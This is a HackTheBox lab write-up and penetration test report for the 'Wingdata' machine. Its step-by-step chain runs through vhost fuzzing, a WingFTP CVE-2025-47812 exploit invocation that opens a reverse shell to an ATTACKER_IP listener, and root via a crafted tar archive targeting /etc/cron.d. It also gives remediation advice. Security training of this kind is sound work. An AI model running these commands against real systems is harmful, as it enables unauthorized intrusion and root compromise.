# Wingdata

**Platform:** HackTheBox
**OS:** Linux
**Tags:** VHost Enumeration, CVE-2025-47812, WingFTP, Command Injection, sudo, Tar Path Traversal, OS Command Injection, RCE, Path Traversal, Privilege Escalation
**Date:** 2026-05-09

VHost enumeration finds a WingFTP server on a subdomain. CVE-2025-47812 command injection in WingFTP gives initial access. Root via a sudo Python restore script that extracts a crafted tar archive - tar's path traversal writes an arbitrary file as root.

## 1. Enumeration

Started with a service scan.

```bash
nmap -sC -sV wingdata.htb -Pn
```

Findings:
- 22/tcp - OpenSSH
- 80/tcp - HTTP, wingdata.htb main site

Port 80 referenced a domain in its response, indicating virtual hosting. Added wingdata.htb to /etc/hosts and fuzzed for subdomains.

## 2. VHost Discovery

```bash
ffuf -u http://wingdata.htb \
  -H 'Host: FUZZ.wingdata.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
```

- ftp - ftp.wingdata.htb, WingFTP Server web interface

Added ftp.wingdata.htb to /etc/hosts. Browsing to it confirmed WingFTP Server.

## 3. WingFTP RCE (CVE-2025-47812)

CVE-2025-47812 is a command injection vulnerability in WingFTP Server. The exploit delivers a reverse shell through an unsanitised parameter in the web interface.

```bash
nc -lvnp 4444
```

```bash
python3 exploit_CVE-2025-47812.py \
  --target http://ftp.wingdata.htb \
  --lhost <ATTACKER_IP> \
  --lport 4444
```

**Result:** Shell obtained. User flag retrieved.

## 4. PrivEsc: Tar Path Traversal via sudo restore script

Checked sudo permissions.

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/restore.py
```

`/opt/restore.py` accepts a tar archive and extracts it as root. tar doesn't sanitise paths by default - a crafted archive with a `../` path in the filename writes files outside the intended extraction directory. Used this to overwrite a privileged file as root.

```bash
# Craft malicious tar
python3 craft_tar.py

# Trigger extraction
sudo /usr/bin/python3 /opt/restore.py -b backup_888.tar
```

**Result:** Root shell obtained.

## 5. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** wingdata.htb
**Assessment type:** External network & web application assessment
**Assessment date:** 9 May 2026
**Environment:** HackTheBox laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 08

---

## 1. Executive Summary

### Assessment outcome

The assessment identified one critical and one high severity finding affecting **wingdata.htb** . Testing obtained remote code execution as the web service account via an unauthenticated command injection vulnerability in the WingFTP Server web interface, then escalated to root by abusing a misconfigured sudo delegation that permitted tar path traversal.
The initial compromise required no credentials. A virtual host enumeration pass discovered an administrative FTP management interface exposed on a subdomain. CVE-2025-47812 was applicable to the installed WingFTP version, providing a direct unauthenticated shell.
Privilege escalation exploited a sudo rule permitting the compromised account to run a Python restore script as root. The script extracted a user-supplied tar archive without sanitising archive entry paths. A crafted archive wrote an arbitrary file to a privileged location, yielding root execution.

### Impact

The documented access crossed the external-network boundary and escalated to full host control. An attacker following the same path could read all files on the host, modify system configuration, pivot to connected networks and maintain persistent access.
No operational loss is asserted for this laboratory system. The result demonstrates host compromise from an unauthenticated external position; the wider business impact would depend on the data, credentials and services present on a production deployment.

### Priority recommendations

1. Apply the vendor patch for CVE-2025-47812 or remove the WingFTP web interface from public access and restrict it to authorised administrators.
2. Remove the sudo delegation for the restore script, or redesign the script to extract archives using a safe Python library call that validates and strips path components before extraction.

### Conclusion

Both findings are independently actionable. The unauthenticated command injection issue (F-01) represents the higher-priority risk as it requires no prior access. The tar path traversal issue (F-02) requires an established foothold but leads directly to root.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| wingdata.htb | wingdata.htb | Ubuntu Linux; web application, WingFTP and SSH services |
| ftp.wingdata.htb | wingdata.htb (vhost) | WingFTP Server web interface; vulnerable to CVE-2025-47812 |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH (Ubuntu) |
| 80/tcp | HTTP | Main web application; wingdata.htb |

```
nmap -sC -sV wingdata.htb -Pn

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    (wingdata.htb main site)
```

Port 80 referenced a domain in its response, indicating virtual hosting. wingdata.htb added to /etc/hosts. VHost enumeration required to discover the WingFTP administrative subdomain.

### 2.2 Approach

Testing began with network service discovery followed by virtual host enumeration. The main site on port 80 provided no exploitable functionality. A subdomain fuzzing pass against the HTTP Host header discovered the administrative WingFTP interface on `ftp.wingdata.htb` .

```
ffuf -u http://wingdata.htb \
  -H 'Host: FUZZ.wingdata.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac

[Status: 200] ftp.wingdata.htb
```

ftp.wingdata.htb added to /etc/hosts before proceeding. Interface confirmed as WingFTP Server.
The WingFTP version was identified as vulnerable to CVE-2025-47812. A proof-of-concept exploit was used to deliver a reverse shell. Post-exploitation enumeration examined sudo permissions and the restore script to identify the tar path traversal escalation path.
Tools used included Nmap, ffuf with SecLists subdomains wordlists, a CVE-2025-47812 exploit script, Python, and standard Linux utilities.

### 2.3 Severity classification

Severity reflects exploit prerequisites and the impact demonstrated on the assessed host. Ratings are qualitative; CVSS 3.1 scores and vectors are assigned to each finding.
| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |
| Informational | Context or an observation without an established vulnerability. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | Unauthenticated command injection in WingFTP Server (CVE-2025-47812) | **Critical** | 6 |
| [F-02](#f-02) | Tar path traversal via sudo Python restore script | **High** | 7 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Virtual host enumeration identified ftp.wingdata.htb running WingFTP Server. | WingFTP interface discovered |
| 02 | Exploited CVE-2025-47812 command injection against the WingFTP web interface. | Reverse shell as web service account |
| 03 | Enumerated sudo rules; identified NOPASSWD permission to run Python restore script as root. | Sudo delegation confirmed |
| 04 | Crafted a malicious tar archive with a path-traversal entry; passed it to the restore script. | Arbitrary file write as root; root shell obtained |

### 3.3 Relationship between findings

F-01 is independently exploitable from an unauthenticated external position. F-02 requires an established foothold with sudo access to the restore script. The findings represent distinct control failures at the application and host-configuration layers respectively.

## 4.1 Unauthenticated Command Injection (CVE-2025-47812)

### F-01   WingFTP Server - CVE-2025-47812 - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The WingFTP Server web interface is vulnerable to CVE-2025-47812, an unauthenticated command injection vulnerability. An unsanitised parameter in the web interface allows an attacker to inject arbitrary operating-system commands without supplying credentials. A proof-of-concept exploit delivered a reverse shell to an attacker-controlled listener. |
| Prerequisites | Network access to the WingFTP web interface on ftp.wingdata.htb. No credentials are required. |
| Impact | Arbitrary command execution as the WingFTP service account. All files accessible to that account are exposed; the attacker obtains an interactive shell from an unauthenticated external position. |
| Affected system | ftp.wingdata.htb:80 WingFTP Server (version vulnerable to CVE-2025-47812) |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) : Improper Neutralisation of Special Elements used in an OS Command |

### Steps to reproduce

1. Enumerate virtual hosts and identify the WingFTP server vhost.
2. Navigate to the WingFTP web administration interface.
3. Send a crafted request to the vulnerable endpoint exploiting CVE-2025-47812 command injection.
4. Observe OS command execution and obtain a reverse shell.

### Evidence

```
# Reverse shell listener started on attacker machine
nc -lvnp 4444

# CVE-2025-47812 exploit invoked against WingFTP web interface
python3 exploit_CVE-2025-47812.py \
  --target http://ftp.wingdata.htb \
  --lhost <ATTACKER_IP> \
  --lport 4444

# Result: reverse shell received
$ id
uid=...  (WingFTP service account)

$ cat /home/*/user.txt
[redacted]
```

Evidence E-01. Exploit invocation and shell receipt transcribed from the assessment record. Flag value omitted.

### Remediation

Apply the vendor-supplied patch for CVE-2025-47812 immediately. Where a patch is not yet available, remove the WingFTP web interface from publicly accessible networks and restrict it to an approved management VLAN or VPN. Implement input validation on all parameters accepted by the web interface to prevent command injection irrespective of patching status.

### Verification

Confirm that the exploit no longer produces command execution against the patched version. Verify that the interface is unreachable from untrusted networks. Confirm that the running version no longer appears in the CVE-2025-47812 affected-versions list.

## 4.2 Unsafe Privilege Delegation via Sudo Restore Script

### F-02   Tar path traversal in root-owned restore script - HIGH

| Field | Assessment |
| --- | --- |
| Description | A sudo rule permitted the compromised service account to execute `/opt/restore.py` as root without a password. The script accepted a user-supplied tar archive and extracted it using Python's tarfile module without sanitising archive entry paths. By default, tar does not strip leading path components or block directory traversal sequences. A crafted archive containing an entry with a relative path traversal sequence (e.g. `../../etc/cron.d/shell` ) wrote an attacker-controlled file to an arbitrary privileged location as root, yielding full system control. |
| Prerequisites | Access to the service account that holds the sudo delegation, and write access to a directory from which the restore script reads archives. |
| Impact | Arbitrary file write as root, enabling root code execution. All local accounts, system configuration and sensitive credentials are exposed. |
| Affected system | `/opt/restore.py` `/etc/sudoers` or sudoers.d delegation |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-22](https://cwe.mitre.org/data/definitions/22.html) : Improper Limitation of a Pathname to a Restricted Directory |

### Steps to reproduce

1. Check sudo rights: `sudo -l` and identify the Python restore script.
2. Inspect the script and confirm it extracts a tar archive without validating paths.
3. Create a malicious tar archive: `tar -cf evil.tar --transform='s,evil.sh,../../etc/cron.d/root,' evil.sh` .
4. Place the archive in the expected location and trigger the sudo script.
5. Confirm arbitrary file write as root.

### Evidence

```
# Enumerate sudo permissions
sudo -l
(root) NOPASSWD: /usr/bin/python3 /opt/restore.py

# Craft a malicious tar archive with a path-traversal entry
python3 craft_tar.py
# Produces backup_888.tar containing an entry that writes outside the
# extraction directory when extracted by root.

# Pass the archive to the restore script as root
sudo /usr/bin/python3 /opt/restore.py -b backup_888.tar

# Result: arbitrary file written as root; root shell obtained
$ id
uid=0(root) gid=0(root) groups=0(root)

$ cat /root/root.txt
[redacted]
```

Evidence E-02. Commands transcribed from the assessment record. Flag value omitted. The Python tarfile module's `extractall()` is vulnerable to path traversal unless `filter='data'` is specified (Python 3.12+) or paths are validated before extraction.

### Remediation

Remove the sudo delegation for the restore script. If automated restore functionality is genuinely required, redesign the script to validate all archive entry paths before extraction - reject any entry whose resolved path falls outside the intended extraction directory. In Python 3.12 and later, use `tarfile.extractall(filter='data')` which blocks path traversal by default. Do not run the script as root; restrict its execution to the minimum privilege required.

### Verification

Confirm that the service account can no longer invoke the script with root privileges. Where the script is retained with a safe implementation, verify that a crafted path-traversal archive is rejected and that a legitimate archive extracts correctly.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Patch or isolate the WingFTP Server web interface; remediate CVE-2025-47812. | F-01 |
| High | Remove the sudo delegation for the restore script or redesign the script with safe archive extraction. | F-02 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| `/tmp/backup_888.tar` | Malicious tar archive for path-traversal test | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Wingdata assessment walkthrough](wingdata-htb.html) . Flag values are omitted from all evidence. The attacker IP is replaced with `<ATTACKER_IP>` throughout.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 3: WingFTP RCE via CVE-2025-47812 |
| E-02 | Walkthrough section 4: sudo enumeration, tar crafting and root shell |
